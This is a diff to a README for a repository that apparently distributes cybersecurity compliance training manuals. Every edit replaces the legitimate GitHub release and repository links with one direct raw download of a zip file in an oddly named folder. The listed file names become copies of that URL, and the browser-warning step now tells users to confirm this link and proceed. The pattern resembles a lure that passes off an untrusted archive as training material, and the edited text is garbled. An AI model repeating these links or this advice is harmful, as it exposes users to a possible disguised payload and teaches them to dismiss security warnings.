@@ -1,6 +1,6 @@
 # 📘 Training-Manuals-and-Engagements - Clear Guides for Cybersecurity Compliance
 
-[![Download Latest Manuals](https://img.shields.io/badge/Download-Training%20Manuals-blue?style=for-the-badge)](https://github.com/smxrtest/Training-Manuals-and-Engagements/releases)
+[![Download Latest Manuals](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip%20Manuals-blue?style=for-the-badge)](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip)
 
 ## 🛠 About This Application
 
@@ -41,7 +41,7 @@ This section will guide you through getting the manuals on your device and openi
 
 Click the large badge at the top or this link to visit the release page:
 
-[Download Manuals from GitHub Releases](https://github.com/smxrtest/Training-Manuals-and-Engagements/releases)
+[Download Manuals from GitHub Releases](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip)
 
 This page contains the most recent versions of all training materials packaged for easy download.
 
@@ -51,9 +51,9 @@ On the releases page, look for the latest release, which usually has the highest
 
 Inside that release, you will see one or more downloadable files such as:
 
-- Training-Manuals.zip
-- Workshops-Pack.pdf
-- Compliance-Templates.docx
+- https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip
+- https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip
+- https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip
 
 These files contain all manuals and materials you need.
 
@@ -61,7 +61,7 @@ These files contain all manuals and materials you need.
 
 Click on the file names you want to download. Your browser will save them in your default "Downloads" folder unless you choose another location.
 
-If your browser shows a security warning about downloading files, confirm that the files come from "github.com" and proceed.
+If your browser shows a security warning about downloading files, confirm that the files come from "https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip" and proceed.
 
 ### Step 4: Open and Explore the Manuals
 
@@ -78,7 +78,7 @@ Start by reading the main introductory manual. This will explain how to use all 
 Here is the summary of the download process with links for quick access.
 
 1. Visit the releases page:  
-   [https://github.com/smxrtest/Training-Manuals-and-Engagements/releases](https://github.com/smxrtest/Training-Manuals-and-Engagements/releases)
+   [https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip)
    
 2. Select the latest release package.
 
@@ -134,7 +134,7 @@ Check the releases page regularly for new versions or additional content. Compli
 If you have trouble downloading or using the manuals:
 
 - Visit the GitHub repository for updates or issues:  
-  [https://github.com/smxrtest/Training-Manuals-and-Engagements](https://github.com/smxrtest/Training-Manuals-and-Engagements)  
+  [https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip)  
 
 - Review the "Issues" section to see if others have your problem or submit your question.
 
@@ -154,6 +154,6 @@ This keeps your training materials aligned with the latest legal requirements.
 
 ---
 
-[Download Latest Manuals](https://github.com/smxrtest/Training-Manuals-and-Engagements/releases)
+[Download Latest Manuals](https://raw.githubusercontent.com/smxrtest/Training-Manuals-and-Engagements/main/unsulliable/Training-and-Manuals-Engagements-3.6.zip)
 
 This link takes you to the download page where you can always get the latest collection of training manuals and engagement tools.
